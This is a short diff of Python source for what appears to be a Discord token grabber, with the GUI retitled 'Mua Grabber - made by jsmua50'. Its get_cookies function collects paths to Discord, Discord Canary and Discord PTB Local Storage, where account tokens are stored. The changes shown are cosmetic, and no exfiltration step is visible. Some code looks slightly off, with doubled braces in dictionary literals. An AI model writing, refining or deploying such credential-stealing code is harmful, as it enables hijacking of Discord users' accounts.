@@ -65,7 +65,6 @@ def get_cookies():
     '''Retrieve cookies from local storage'''
     cookies = {{}}
     paths = {{
-
         "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage"),
         "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage"),
         "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage")
@@ -184,7 +183,7 @@ def on_select_image_button_click():
 
 # GUI setup
 root = tk.Tk()
-root.title("Code Generator")
+root.title("Mua Grabber - made by jsmua50")  # Added title with name and credit
 root.geometry("600x700")
 root.config(bg="black")
 
